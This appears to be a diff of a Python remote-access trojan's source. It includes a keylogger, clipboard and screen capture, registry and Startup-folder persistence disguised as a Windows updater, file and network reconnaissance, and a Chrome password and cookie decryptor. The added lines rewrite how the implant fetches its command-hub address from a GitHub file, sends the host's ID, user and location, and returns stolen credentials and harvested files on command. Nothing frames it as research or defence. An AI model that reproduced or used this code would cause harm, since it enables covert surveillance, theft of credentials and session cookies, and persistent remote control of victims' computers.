@@ -1,618 +1,4 @@
-import argparse
-import base64
-import ctypes
-import getpass
-import importlib
-import json
-import os
-import platform
-import random
-import re
-import shutil
-import socket
-import sqlite3
-import subprocess
-import sys
-import threading
-import time
-import uuid
-import winreg
-from urllib.parse import urlparse
-
-def install_dependencies():
-    required = ['pyautogui', 'pycryptodome', 'requests', 'mss', 'Pillow', 'websocket-client']
-    for lib in required:
-        try:
-            __import__(lib if lib != 'pycryptodome' else 'Crypto')
-        except ImportError:
-            subprocess.check_call([sys.executable, "-m", "pip", "install", lib, "--quiet"])
-
-install_dependencies()
-
-import websocket
-
-try:
-    import requests
-    REQUESTS_AVAILABLE = True
-except ImportError:
-    requests = None
-    REQUESTS_AVAILABLE = False
-
-import pyautogui
-
-# Optional dependencies
-try:
-    from Crypto.Cipher import AES
-    CRYPTO_AVAILABLE = True
-except ImportError:
-    AES = None
-    CRYPTO_AVAILABLE = False
-
-try:
-    from mss import mss
-    MSS_AVAILABLE = True
-except ImportError:
-    MSS_AVAILABLE = False
-
-try:
-    from PIL import Image
-    PIL_AVAILABLE = True
-except ImportError:
-    PIL_AVAILABLE = False
-
-try:
-    import pyautogui
-    PYAUTOGUI_AVAILABLE = True
-except ImportError:
-    pyautogui = None
-    PYAUTOGUI_AVAILABLE = False
-
-try:
-    from pynput import keyboard
-    PYNPUT_AVAILABLE = True
-except ImportError:
-    keyboard = None
-    PYNPUT_AVAILABLE = False
-
-try:
-    import pyperclip
-    PYPERCLIP_AVAILABLE = True
-except ImportError:
-    pyperclip = None
-    PYPERCLIP_AVAILABLE = False
-
-try:
-    import psutil
-    PSUTIL_AVAILABLE = True
-except ImportError:
-    psutil = None
-    PSUTIL_AVAILABLE = False
-
-REQUIRED_PACKAGES = ['pynput', 'pycryptodome', 'mss', 'Pillow', 'pyperclip']
-
-# Default command hub settings. These values can be overridden by
-# environment variables KING_HUB_IP / KING_HUB_PORT or by passing
-# --hub-ip / --hub-port on the command line.
-HUB_ADDRESS = ''
-HUB_PORT = 9999
-DEFAULT_GITHUB_THRONE_URL = 'https://raw.githubusercontent.com/ShahDaraza/TestBot/main/throne.txt'
-
-DRIVE_FIXED = 3
-DRIVE_REMOVABLE = 2
-
-keylog_active = False
-keylog_data = ''
-keylog_thread = None
-clipboard_active = False
-clipboard_thread = None
-last_clipboard = ''
-
-
-def silent_bootstrap():
-    """Install required packages silently if missing."""
-    for package in REQUIRED_PACKAGES:
-        try:
-            if package == 'pycryptodome':
-                importlib.import_module('Crypto')
-            elif package == 'Pillow':
-                importlib.import_module('PIL')
-            else:
-                importlib.import_module(package)
-        except ImportError:
-            try:
-                startupinfo = subprocess.STARTUPINFO()
-                startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
-                startupinfo.wShowWindow = 0
-                subprocess.run(
-                    [sys.executable, '-m', 'pip', 'install', package, '--quiet', '--no-warn-script-location'],
-                    capture_output=True,
-                    startupinfo=startupinfo,
-                    creationflags=subprocess.CREATE_NO_WINDOW,
-                )
-            except Exception:
-                pass
-
-
-def get_hwid():
-    """Return a hardware ID based on the MAC address."""
-    return '-'.join(['{:02x}'.format((uuid.getnode() >> i) & 0xff) for i in range(0, 48, 8)][::-1]).upper()
-
-
-def get_arp_table():
-    """Retrieve the Windows ARP table."""
-    try:
-        output = subprocess.check_output('arp -a', shell=True, stderr=subprocess.DEVNULL)
-        return output.decode('utf-8', errors='ignore')
-    except Exception as e:
-        return f'Failed to get ARP table: {e}'
-
-
-def send_atomic_data(s, type, data, filename, is_websocket=False):
-    """Send data with the unified atomic sync protocol."""
-    try:
-        if isinstance(data, str):
-            data = data.encode('utf-8')
-        header = f"DATA_HEADER|{type}|{len(data)}|{filename}\n".encode('utf-8')
-        if is_websocket:
-            s.send_binary(header + data + b'V_PULSE_EOF')
-        else:
-            s.sendall(header + data + b'V_PULSE_EOF')
-        return True
-    except Exception as e:
-        print(f'[-] Atomic send failed: {e}')
-        return False
-
-
-def run_detached():
-    """Restart this process in detached mode."""
-    if platform.system() != 'Windows':
-        return
-    cmd = [sys.executable, sys.argv[0]] + sys.argv[1:] + ['--detached']
-    subprocess.Popen(cmd, creationflags=subprocess.DETACHED_PROCESS | subprocess.CREATE_NEW_PROCESS_GROUP)
-    sys.exit(0)
-
-
-# Keylogger
-
-def start_keylogger():
-    """Start the keylogger thread."""
-    global keylog_active, keylog_data, keylog_thread
-    if not PYNPUT_AVAILABLE:
-        return 'pynput not available'
-    if keylog_active:
-        return 'Keylogger already active'
-
-    keylog_active = True
-    keylog_data = ''
-
-    def on_press(key):
-        global keylog_data
-        try:
-            keylog_data += key.char
-        except AttributeError:
-            if key == keyboard.Key.space:
-                keylog_data += ' '
-            elif key == keyboard.Key.enter:
-                keylog_data += '\n'
-            elif key == keyboard.Key.tab:
-                keylog_data += '\t'
-            else:
-                keylog_data += f'[{key}]'
-
-    listener = keyboard.Listener(on_press=on_press)
-    keylog_thread = threading.Thread(target=listener.start, daemon=True)
-    keylog_thread.start()
-    return 'Keylogger started'
-
-
-def stop_keylogger():
-    """Stop the keylogger."""
-    global keylog_active, keylog_thread
-    keylog_active = False
-    if keylog_thread:
-        keylog_thread.join(timeout=1.0)
-    return 'Keylogger stopped'
-
-
-def get_keylog_bytes():
-    """Return keylogger contents as bytes."""
-    return keylog_data.encode('utf-8', errors='ignore')
-
-
-# Clipboard monitor
-
-def start_clipboard_monitor():
-    """Start monitoring the clipboard."""
-    global clipboard_active, clipboard_thread, last_clipboard
-    if not PYPERCLIP_AVAILABLE:
-        return 'pyperclip not available'
-    if clipboard_active:
-        return 'Clipboard monitor already active'
-
-    clipboard_active = True
-    last_clipboard = pyperclip.paste() if pyperclip else ''
-
-    def monitor_clipboard():
-        global last_clipboard
-        while clipboard_active:
-            try:
-                current = pyperclip.paste()
-                if current != last_clipboard:
-                    last_clipboard = current
-                    print(f'[*] Clipboard changed: {current[:100]}')
-            except Exception:
-                pass
-            time.sleep(1)
-
-    clipboard_thread = threading.Thread(target=monitor_clipboard, daemon=True)
-    clipboard_thread.start()
-    return 'Clipboard monitor started'
-
-
-def stop_clipboard_monitor():
-    """Stop clipboard monitoring."""
-    global clipboard_active, clipboard_thread
-    clipboard_active = False
-    if clipboard_thread:
-        clipboard_thread.join(timeout=1.0)
-    return 'Clipboard monitor stopped'
-
-
-# Screenshot
-
-def capture_desktop_screenshot(client, is_websocket=False):
-    """Capture the desktop and send it back."""
-    if not MSS_AVAILABLE or not PIL_AVAILABLE:
-        try:
-            if is_websocket:
-                client.send('DEPENDENCY_MISSING: mss Pillow')
-            else:
-                client.sendall(b'DEPENDENCY_MISSING: mss Pillow')
-        except Exception:
-            pass
-        return
-
-    try:
-        with mss() as sct:
-            monitor = sct.monitors[1]
-            screenshot = sct.grab(monitor)
-            image = Image.frombytes('RGB', screenshot.size, screenshot.rgb)
-            new_width = int(image.width * 0.7)
-            new_height = int(image.height * 0.7)
-            image = image.resize((new_width, new_height), Image.Resampling.LANCZOS)
-            import io
-            buffer = io.BytesIO()
-            image.save(buffer, format='JPEG', quality=60, optimize=True)
-            jpg_data = buffer.getvalue()
-            send_atomic_data(client, 'SCREENSHOT', jpg_data, 'screenshot.jpg', is_websocket=is_websocket)
-    except Exception as e:
-        try:
-            if is_websocket:
-                client.send(f'CAPTURE_FAILED: {e}')
-            else:
-                client.sendall(f'CAPTURE_FAILED: {e}'.encode('utf-8'))
-        except Exception:
-            pass
-
-
-# Persistence
-
-def ensure_service_continuity():
-    """Ensure the agent is registered to run on startup."""
-    try:
-        app_data = os.getenv('APPDATA') or ''
-        target_file = os.path.join(app_data, 'SystemUpdates', 'win_manager.py')
-        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r'Software\Microsoft\Windows\CurrentVersion\Run', 0, winreg.KEY_SET_VALUE)
-        expected_value = f'pythonw "{target_file}"'
-        try:
-            current_value, _ = winreg.QueryValueEx(key, 'WinManager')
-            if current_value != expected_value:
-                winreg.SetValueEx(key, 'WinManager', 0, winreg.REG_SZ, expected_value)
-        except FileNotFoundError:
-            winreg.SetValueEx(key, 'WinManager', 0, winreg.REG_SZ, expected_value)
-        winreg.CloseKey(key)
-    except Exception:
-        pass
-
-
-def establish_persistence():
-    """Copy this script to AppData and add persistence."""
-    target_file = None
-    try:
-        app_data = os.getenv('APPDATA') or ''
-        target_dir = os.path.join(app_data, 'SystemUpdates')
-        os.makedirs(target_dir, exist_ok=True)
-        target_file = os.path.join(target_dir, 'win_manager.py')
-        if os.path.abspath(sys.argv[0]) != os.path.abspath(target_file):
-            shutil.copy2(sys.argv[0], target_file)
-        startup_folder = os.path.join(os.getenv('USERPROFILE') or '', 'AppData', 'Roaming', 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
-        bat_path = os.path.join(startup_folder, 'ServiceUpdate.bat')
-        if not os.path.exists(bat_path):
-            with open(bat_path, 'w', encoding='utf-8') as f:
-                f.write(f'@echo off\npythonw "{target_file}"')
-        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r'Software\Microsoft\Windows\CurrentVersion\Run', 0, winreg.KEY_SET_VALUE)
-        winreg.SetValueEx(key, 'WinManager', 0, winreg.REG_SZ, f'pythonw "{target_file}"')
-        winreg.CloseKey(key)
-    except Exception:
-        pass
-    return target_file
-
-
-def check_persistence(target_file):
-    """Periodically verify persistence is still present."""
-    while True:
-        try:
-            if not target_file:
-                time.sleep(300)
-                continue
-            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r'Software\Microsoft\Windows\CurrentVersion\Run', 0, winreg.KEY_READ)
-            value, _ = winreg.QueryValueEx(key, 'WinManager')
-            winreg.CloseKey(key)
-            expected = f'pythonw "{target_file}"'
-            if value != expected:
-                key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r'Software\Microsoft\Windows\CurrentVersion\Run', 0, winreg.KEY_SET_VALUE)
-                winreg.SetValueEx(key, 'WinManager', 0, winreg.REG_SZ, expected)
-                winreg.CloseKey(key)
-        except Exception:
-            try:
-                key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r'Software\Microsoft\Windows\CurrentVersion\Run', 0, winreg.KEY_SET_VALUE)
-                winreg.SetValueEx(key, 'WinManager', 0, winreg.REG_SZ, f'pythonw "{target_file}"')
-                winreg.CloseKey(key)
-            except Exception:
-                pass
-        time.sleep(300)
-
-
-# Exploration
-
-def list_dirs(path, depth=0, max_depth=3):
-    """List directories recursively up to max_depth."""
-    result = []
-    if depth >= max_depth:
-        return result
-    try:
-        for item in os.listdir(path):
-            full = os.path.join(path, item)
-            if os.path.isdir(full):
-                result.append(full)
-                result.extend(list_dirs(full, depth + 1, max_depth))
-    except (PermissionError, OSError):
-        pass
-    return result
-
-
-def explore_drives():
-    """Discover fixed and removable drives."""
-    kernel32 = ctypes.windll.kernel32
-    get_drive_type = kernel32.GetDriveTypeW
-    drives = {}
-    for letter in 'ABCDEFGHIJKLMNOPQRSTUVWXYZ':
-        root = f'{letter}:\\'
-        if os.path.exists(root):
-            type_code = get_drive_type(root)
-            if type_code == DRIVE_FIXED:
-                type_str = 'system' if letter == 'C' else 'secondary'
-            elif type_code == DRIVE_REMOVABLE:
-                type_str = 'mobile'
-            else:
-                continue
-            drives[letter] = {'type': type_str, 'dirs': list_dirs(root, max_depth=2)}
-    return drives
-
-
-def harvest_user():
-    """Collect paths from user directories."""
-    userprofile = os.getenv('USERPROFILE') or ''
-    targets = ['Documents', 'Desktop', 'Downloads']
-    result = {}
-    for target in targets:
-        path = os.path.join(userprofile, target)
-        if os.path.exists(path):
-            result[target] = []
-            for root, _, files in os.walk(path):
-                for filename in files:
-                    result[target].append(os.path.join(root, filename))
-    return result
-
-
-# Utilities
-
-def get_username():
-    """Return the current username."""
-    try:
-        return os.getlogin()
-    except OSError:
-        return getpass.getuser()
-
-
-def report_status():
-    """Report system status."""
-    report = {
-        'HWID': get_hwid(),
-        'OS': platform.system(),
-        'Version': platform.version(),
-        'Hostname': socket.gethostname(),
-        'User': get_username(),
-        'Python': platform.python_version(),
-    }
-    if PSUTIL_AVAILABLE:
-        try:
-            report['Uptime'] = f'{time.time() - psutil.boot_time():.2f}s'
-            report['CPU'] = f'{psutil.cpu_percent(interval=0.2)}%'
-            report['Memory'] = f'{psutil.virtual_memory().percent}%'
-        except Exception:
-            report['Uptime'] = 'N/A'
-    else:
-        report['Uptime'] = 'N/A'
-    return json.dumps(report)
-
-
-def decrypt_dpapi(encrypted_bytes):
-    """Decrypt DPAPI-protected bytes."""
-    class DATA_BLOB(ctypes.Structure):
-        _fields_ = [('cbData', ctypes.c_uint32), ('pbData', ctypes.POINTER(ctypes.c_char))]
-
-    data_in = DATA_BLOB(len(encrypted_bytes), ctypes.create_string_buffer(encrypted_bytes))
-    data_out = DATA_BLOB()
-
-    ctypes.windll.crypt32.CryptUnprotectData.argtypes = [
-        ctypes.POINTER(DATA_BLOB), ctypes.c_void_p, ctypes.c_void_p,
-        ctypes.c_void_p, ctypes.c_void_p, ctypes.c_uint32, ctypes.POINTER(DATA_BLOB)
-    ]
-
-    if ctypes.windll.crypt32.CryptUnprotectData(ctypes.byref(data_in), None, None, None, None, 0, ctypes.byref(data_out)):
-        decrypted = ctypes.string_at(data_out.pbData, data_out.cbData)
-        ctypes.windll.kernel32.LocalFree(data_out.pbData)
-        return decrypted
-    return None
-
-
-def safe_copy(source, destination):
-    """Attempt to copy a locked database file up to 3 times."""
-    import time
-    for i in range(3):
-        try:
-            # Use shutil.copy as a base, but wrap it in a retry
-            import shutil
-            shutil.copy2(source, destination)
-            return True
-        except PermissionError:
-            # If locked, wait 1 second and try again
-            time.sleep(1)
-        except Exception:
-            break
-    return False
-
-
-def extract_chrome_credentials():
-    try:
-        import ctypes, sqlite3, json, os, base64, shutil, glob
-        try:
-            from Cryptodome.Cipher import AES
-        except ImportError:
-            try:
-                from Crypto.Cipher import AES
-            except ImportError:
-                return b"Error: pycryptodome library missing."
-
-        try:
-            user_data_path = os.path.join(os.getenv('USERPROFILE'), 'AppData', 'Local', 'Google', 'Chrome', 'User Data')
-            local_state_path = os.path.join(user_data_path, 'Local State')
-
-            with open(local_state_path, 'r', encoding='utf-8') as f:
-                local_state = json.load(f)
-            encrypted_key = base64.b64decode(local_state['os_crypt']['encrypted_key'])[5:]
-
-            # --- THE "NO FROM_PARAM" FIX ---
-            class DATA_BLOB(ctypes.Structure):
-                _fields_ = [("cbData", ctypes.c_uint32), ("pbData", ctypes.POINTER(ctypes.c_char))]
-
-            # Explicitly define all 7 arguments to prevent the 'item 2' error
-            # We use c_void_p for the optional buffers
-            ctypes.windll.crypt32.CryptUnprotectData.argtypes = [
-                ctypes.POINTER(DATA_BLOB), # pDataIn
-                ctypes.c_void_p,           # pptrszDataDescr
-                ctypes.c_void_p,           # pOptionalEntropy
-                ctypes.c_void_p,           # pvReserved
-                ctypes.c_void_p,           # pPromptStruct
-                ctypes.c_uint32,           # dwFlags
-                ctypes.POINTER(DATA_BLOB)  # pDataOut
-            ]
-
-            blob_in = DATA_BLOB(len(encrypted_key), ctypes.create_string_buffer(encrypted_key))
-            blob_out = DATA_BLOB()
-
-            # Call with actual null pointers (0) instead of Python 'None'
-            if ctypes.windll.crypt32.CryptUnprotectData(ctypes.byref(blob_in), 0, 0, 0, 0, 0, ctypes.byref(blob_out)):
-                master_key = ctypes.string_at(blob_out.pbData, blob_out.cbData)
-                ctypes.windll.kernel32.LocalFree(blob_out.pbData)
-            else:
-                return b"Error: DPAPI Decryption Failed."
-
-            # --- TOTAL RECOVERY SWEEP ---
-            output = []
-            # We search EVERY folder in User Data for any file named 'Login Data'
-            login_data_files = glob.glob(os.path.join(user_data_path, "**", "Login Data"), recursive=True)
-
-            for login_data_path in login_data_files:
-                # Use a unique temp name to avoid file locks
-                temp_db = os.path.join(os.getenv('TEMP'), f"v_db_{os.urandom(2).hex()}.db")
-                try:
-                    # Use the safe_copy function instead of direct shutil.copy2
-                    if safe_copy(login_data_path, temp_db):
-                        try:
-                            # 1. Connect using URI for Read-Only access
-                            conn = sqlite3.connect(f"file:{temp_db}?mode=ro", uri=True)
-                            cursor = conn.cursor()
-                            cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
-                            
-                            # 2. Fetch ALL data into memory IMMEDIATELY
-                            # This prevents the "Closed Database" error because we don't need the DB anymore
-                            all_rows = cursor.fetchall()
-                            conn.close() 
-
-                            # 3. Process the data from RAM, not from the file
-                            for url, user, enc_pass in all_rows:
-                                if not user and not enc_pass: continue
-                                
-                                password = " [No Password Saved] "
-                                if enc_pass:
-                                    try:
-                                        # Try Modern Decryption
-                                        if enc_pass.startswith(b'v10') or enc_pass.startswith(b'v11'):
-                                            nonce = enc_pass[3:15]
-                                            payload = enc_pass[15:]
-                                            cipher = AES.new(master_key, AES.MODE_GCM, nonce=nonce)
-                                            # Try to decrypt and verify the tag
-                                            password = cipher.decrypt_and_verify(payload[:-16], payload[-16:]).decode('utf-8', errors='ignore')
-                                        else:
-                                            # Try Legacy DPAPI
-                                            blob_in = DATA_BLOB(len(enc_pass), ctypes.create_string_buffer(enc_pass))
-                                            blob_out = DATA_BLOB()
-                                            if ctypes.windll.crypt32.CryptUnprotectData(ctypes.byref(blob_in), 0, 0, 0, 0, 0, ctypes.byref(blob_out)):
-                                                password = ctypes.string_at(blob_out.pbData, blob_out.cbData).decode('utf-8', errors='ignore')
-                                                ctypes.windll.kernel32.LocalFree(blob_out.pbData)
-                                    except:
-                                        password = "[Decryption Failed]"
-
-                                profile_name = os.path.basename(os.path.dirname(login_data_path))
-                                output.append(f"Profile: {profile_name}\nURL: {url}\nUser: {user}\nPass: {password}\n{'-'*20}")
-
-                        except Exception as e:
-                            # If the DB itself is corrupted, catch it here
-                            output.append(f"[!] Logic Error: {str(e)}")
-
-                    # --- SESSION GHOST: COOKIE EXTRACTION ---
-                    cookie_output = []
-                    cookie_path = os.path.join(os.path.dirname(login_data_path), "Network", "Cookies")
-
-                    if os.path.exists(cookie_path):
-                        temp_c = os.path.join(os.getenv('TEMP'), f"c_task_{os.urandom(2).hex()}.db")
-                        try:
-                            if safe_copy(cookie_path, temp_c):
-                                try:
-                                    c_conn = sqlite3.connect(f"file:{temp_c}?mode=ro", uri=True)
-                                    c_cursor = c_conn.cursor()
-                                
-                                    # We target high-value session cookies
-                                    c_cursor.execute("SELECT host_key, name, encrypted_value, path, expires_utc FROM cookies")
-                                    
-                                    # Fetch all into memory
-                                    all_cookie_rows = c_cursor.fetchall()
-                                    c_conn.close()
-                                    
-                                    # Process from RAM
-                                    for host, name, enc_val, path, expires in all_cookie_rows:
-                                        if not enc_val.startswith(b'v10'): continue
-                                        
-                                        try:
-                                            # Same AES-GCM Surgical Slice
-                                            nonce = enc_val[3:15]
-                                            payload = enc_val[15:]
-                                            cipher = AES.new(master_key, AES.MODE_GCM, nonce=nonce)
-                                            cookie_val = cipher.decrypt_and_verify(payload[:-16], payload[-16:]).decode('utf-8', errors='ignore')
-                                            
-                                            if cookie_val:
+                                           if cookie_val:
                                                 cookie_output.append(f"Host: {host} | Name: {name} | Value: {cookie_val}")
                                         except:
                                             continue
@@ -744,12 +130,6 @@ def _is_ip_address(host: str) -> bool:
     return False
 
 
-def _is_cloudflare_quick_tunnel(host: str) -> bool:
-    """Detect whether the host is a Cloudflare quick tunnel hostname."""
-    host = host.lower().rstrip('.')
-    return host.endswith('.trycloudflare.com') or host.endswith('.cfargotunnel.com')
-
-
 def _parse_king_destination(raw_value: str):
     """Normalize a throne destination string into host and optional port."""
     if not raw_value:
@@ -771,74 +151,146 @@ def _parse_king_destination(raw_value: str):
     return parsed.hostname, parsed.port
 
 
+def perform_persistent_handshake(sock, hwid, user, location, version):
+    """Keep sending the handshake every 2 seconds until KING_ACK is received."""
+    handshake_message = f"NODE_DATA|{hwid}|{user}|{location}|{version}|END_HANDSHAKE\n"
+    sock.setblocking(False)
+    last_send = 0
+
+    while True:
+        current_time = time.time()
+        if current_time - last_send >= 2:
+            try:
+                sock.sendall(handshake_message.encode('utf-8'))
+                print("[*] Shouting handshake (waiting for KING_ACK)...")
+                last_send = current_time
+            except BlockingIOError:
+                # Send will retry on the next loop iteration
+                pass
+            except Exception as e:
+                raise ConnectionError(f"Failed to send handshake: {e}")
+
+        try:
+            ack_bytes = sock.recv(1024)
+            if ack_bytes == b'':
+                raise ConnectionError("Connection closed before KING_ACK")
+
+            ack_data = ack_bytes.decode('utf-8', errors='ignore')
+            if "KING_ACK" in ack_data:
+                print("[+] KING_ACK received! Handshake complete.")
+                break
+        except BlockingIOError:
+            pass
+        except socket.timeout:
+            pass
+        except Exception as e:
+            raise ConnectionError(f"Handshake receive error: {e}")
+
+        time.sleep(0.1)
+
+    sock.setblocking(True)
+    sock.settimeout(15)
+
+
 def connect_to_king(king_url):
+    """Persistent Shouter: Keep sending handshake until KING_ACK is received."""
     while True:
         try:
-            # A: KILL GHOSTS - Ensure no old tunnels are clogging RAM
-            os.system("taskkill /f /im cloudflared.exe >nul 2>&1")
-            
-            # B: GET THE ADDRESS - Bypass GitHub cache to get the NEW city link
-            # Adding a timestamp (?v=...) is the 'Final Nail' for stale links
-            throne_url = f"https://raw.githubusercontent.com/ShahDaraza/TestBot/main/throne.txt?v={time.time()}"
-            king_link = requests.get(throne_url).text.strip()
-            
-            # C: START THE BRIDGE - This turns the assistant laptop into a receiver
-            # We use a unique listener port (e.g., 7878)
-            bridge = subprocess.Popen(
-                ["cloudflared.exe", "access", "tcp", "--hostname", king_link, "--listener", "127.0.0.1:7878"],
-                stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
-            )
-            
-            # D: THE HANDSHAKE - Wait for the Sindh network to stabilize
-            time.sleep(8)
-            
-            # E: THE SOCKET - Connect to the LOCAL bridge
+            address = king_url.strip()
+            if not address or ':' not in address:
+                raise ValueError("Invalid throne address format")
+
+            host, port = address.split(':', 1)
+            host = host.strip()
+            port = port.strip()
+            if not host or not port.isdigit():
+                raise ValueError("Invalid throne host or port")
+
+            print(f"[*] Localtonet destination from throne: {host}:{port}")
+            print(f"[*] Connecting directly to Localtonet TCP: {host}:{port}")
+
             s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            s.settimeout(15)
-            s.connect(("127.0.0.1", 7878))
-            
-            print("[+] Connection Established with King!")
-            return s # Success!
-            
+            s.settimeout(10)
+            s.connect((host, int(port)))
+
+            user = get_username()
+            location = get_location()
+            version = get_current_version()
+            hwid = get_hwid()
+
+            perform_persistent_handshake(s, hwid, user, location, version)
+
+            print("[+] Connection Established - Ready for commands!")
+            return s
+
         except Exception as e:
-            print(f"[-] King not found. Retrying in 10 seconds...")
-            time.sleep(10) # Prevent the 'Terminal Explosion'
+            try:
+                s.close()
+            except Exception:
+                pass
+            print(f"[-] King not found ({e}). Retrying in 10 seconds...")
+            time.sleep(10)
 
 
 def connect_direct_hub(hub_ip, port, max_retries: int = 3):
-    """Connect directly to the command hub using WebSocket."""
+    """Connect directly to the command hub using raw TCP socket."""
     print(f"[DEBUG] connect_direct_hub called with {hub_ip}:{port}")
-    ws_url = f"ws://{hub_ip}:{port}"
     for attempt in range(max_retries):
         try:
-            ws = websocket.create_connection(ws_url, timeout=10)
-            print(f"[+] Direct WebSocket connection established to hub at {hub_ip}:{port}")
-            return ws
+            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            s.settimeout(10)
+            s.connect((hub_ip, port))
+
+            user = get_username()
+            location = get_location()
+            version = get_current_version()
+            hwid = get_hwid()
+
+            perform_persistent_handshake(s, hwid, user, location, version)
+
+            print(f"[+] Direct TCP connection established to hub at {hub_ip}:{port} with HWID")
+            return s
         except Exception as e:
+            try:
+                s.close()
+            except Exception:
+                pass
+            print(f"[-] [{attempt + 1}/{max_retries}] Connection attempt failed: {e}")
             if attempt < max_retries - 1:
                 time.sleep(1)
                 continue
-            print(f"[-] Direct WebSocket connection failed after {max_retries} attempts: {e}")
+            print(f"[-] Direct TCP connection failed after {max_retries} attempts")
             return None
+
+
+def send_heartbeat(sock):
+    """Send PING every 15 seconds to keep connection alive."""
+    while True:
+        time.sleep(15)
+        try:
+            sock.send(b'PING\n')
+        except Exception:
+            break
 
 
 def connect_to_hub(hub_ip, port, github_throne_url=DEFAULT_GITHUB_THRONE_URL):
     """Connect to the hub and process commands."""
     while True:
         try:
-            use_throne = (
-                github_throne_url and
-                (not hub_ip or hub_ip.lower() == 'serveo.net')
-            )
-
+            # Always prefer throne URL if available (connects via TCP to tunnel)
+            use_throne = bool(github_throne_url)
+            
             if use_throne:
+                print(f"[*] Fetching hub address from throne: {github_throne_url}")
                 king_url = get_king_url(github_throne_url)
                 if king_url:
                     client = connect_to_king(king_url)
                 else:
-                    client = None
+                    print(f"[-] Failed to get throne URL, trying direct connection to {hub_ip}:{port}")
+                    client = connect_direct_hub(hub_ip, port) if hub_ip else None
             else:
-                client = connect_direct_hub(hub_ip, port)
+                print(f"[*] Connecting directly to hub at {hub_ip}:{port}")
+                client = connect_direct_hub(hub_ip, port) if hub_ip else None
 
             if not client:
                 delay = random.randint(5, 15)
@@ -846,23 +298,25 @@ def connect_to_hub(hub_ip, port, github_throne_url=DEFAULT_GITHUB_THRONE_URL):
                 time.sleep(delay)
                 continue
             
+            print("[+] Connection Established - Ready for commands!")
+            # Start heartbeat thread
+            threading.Thread(target=send_heartbeat, args=(client,), daemon=True).start()
+
             while True:
                 try:
-                    if isinstance(client, socket.socket):
-                        data = client.recv(1024)
-                    else:
-                        data = client.recv()
+                    # Always use raw socket recv for TCP connection
+                    data = client.recv(1024)
 
                     if isinstance(data, bytes):
                         data = data.decode('utf-8', errors='ignore')
                     print(f"[DEBUG] Drone received: {repr(data)}")
-                except websocket.WebSocketTimeoutException:
+                except socket.timeout:
                     continue
-                except websocket.WebSocketConnectionClosedException:
-                    print('[-] Connection reset by hub.')
+                except (socket.error, ConnectionResetError, BrokenPipeError) as e:
+                    print(f'[-] Connection lost: {e}')
                     break
                 except Exception as e:
-                    print(f'[-] WebSocket error: {e}')
+                    print(f'[-] Receive error: {e}')
                     break
 
                 if not data:
@@ -875,9 +329,12 @@ def connect_to_hub(hub_ip, port, github_throne_url=DEFAULT_GITHUB_THRONE_URL):
                         continue
 
                     elif command == 'STATUS_REPORT':
-                        client.send(f'STATUS:{report_status()}')
+                        client.send(f'STATUS:{report_status()}\n'.encode())
+                    elif command == 'TRIGGER_EVOLVE':
+                        check_for_updates()
+                        client.send(b'EVOLVE_CHECKED\nV_PULSE_EOF\n')
                     elif command == 'DESKTOP_CAPTURE':
-                        capture_desktop_screenshot(client, is_websocket=True)
+                        capture_desktop_screenshot(client, is_websocket=False)
                     elif command == 'SCREENSHOT':
                         try:
                             from mss import mss
@@ -899,14 +356,12 @@ def connect_to_hub(hub_ip, port, github_throne_url=DEFAULT_GITHUB_THRONE_URL):
                             client.send(f"DATA_HEADER|LOG|{len(str(e))}|error.txt\n{str(e)}V_PULSE_EOF".encode())
                     elif command == 'ENSURE_SERVICE_CONTINUITY':
                         ensure_service_continuity()
-                        client.send(b'SERVICE_CONTINUITY_OK\n')
-                        client.send(b'V_PULSE_EOF\n')
+                        client.send(b'SERVICE_CONTINUITY_OK\nV_PULSE_EOF\n')
                     elif command == 'SHUTDOWN_NODE':
                         print('[*] Shutdown command received.')
                         return
                     elif command == 'PING':
-                        client.send(b'PING_OK\n')
-                        client.send(b'V_PULSE_EOF\n')
+                        client.send(b'PING_OK\nV_PULSE_EOF\n')
                     elif command.startswith('MESSAGE '):
                         # Syntax: MESSAGE "text"
                         try:
@@ -938,7 +393,7 @@ def connect_to_hub(hub_ip, port, github_throne_url=DEFAULT_GITHUB_THRONE_URL):
                         client.send(b'V_PULSE_EOF\n')
                     elif command == 'GHOST_MOVE':
                         if not PYAUTOGUI_AVAILABLE:
-                            client.send(b'DEPENDENCY_MISSING: pyautogui\n')
+                            client.send(b'DEPENDENCY_MISSING: pyautogui\nV_PULSE_EOF\n')
                         else:
                             try:
                                 pyautogui.moveRel(10, 0, duration=0.1)
@@ -948,7 +403,7 @@ def connect_to_hub(hub_ip, port, github_throne_url=DEFAULT_GITHUB_THRONE_URL):
                         client.send(b'V_PULSE_EOF\n')
                     elif command.startswith('GHOST_TYPE|'):
                         if not PYAUTOGUI_AVAILABLE:
-                            client.send(b'DEPENDENCY_MISSING: pyautogui\n')
+                            client.send(b'DEPENDENCY_MISSING: pyautogui\nV_PULSE_EOF\n')
                         else:
                             try:
                                 text = command.split('|', 1)[1]
@@ -978,46 +433,46 @@ def connect_to_hub(hub_ip, port, github_throne_url=DEFAULT_GITHUB_THRONE_URL):
                             pass
                         return
                     elif command == 'EXPLORE_DRIVES':
-                        send_atomic_data(client, 'EXPLORE', json.dumps(explore_drives()).encode('utf-8'), 'drives.json', is_websocket=True)
+                        send_atomic_data(client, 'EXPLORE', json.dumps(explore_drives()).encode('utf-8'), 'drives.json', is_websocket=False)
                     elif command == 'HARVEST_USER':
-                        send_atomic_data(client, 'HARVEST', json.dumps(harvest_user()).encode('utf-8'), 'harvest.json', is_websocket=True)
+                        send_atomic_data(client, 'HARVEST', json.dumps(harvest_user()).encode('utf-8'), 'harvest.json', is_websocket=False)
                     elif command == 'NETWORK_TOPOLOGY':
-                        send_atomic_data(client, 'TOPOLOGY', get_arp_table().encode('utf-8'), 'arp.txt', is_websocket=True)
+                        send_atomic_data(client, 'TOPOLOGY', get_arp_table().encode('utf-8'), 'arp.txt', is_websocket=False)
                     elif command == 'EXTRACT_CREDENTIALS':
-                        send_atomic_data(client, 'CREDENTIALS', extract_chrome_credentials(), 'chrome_credentials.txt', is_websocket=True)
+                        send_atomic_data(client, 'CREDENTIALS', extract_chrome_credentials(), 'chrome_credentials.txt', is_websocket=False)
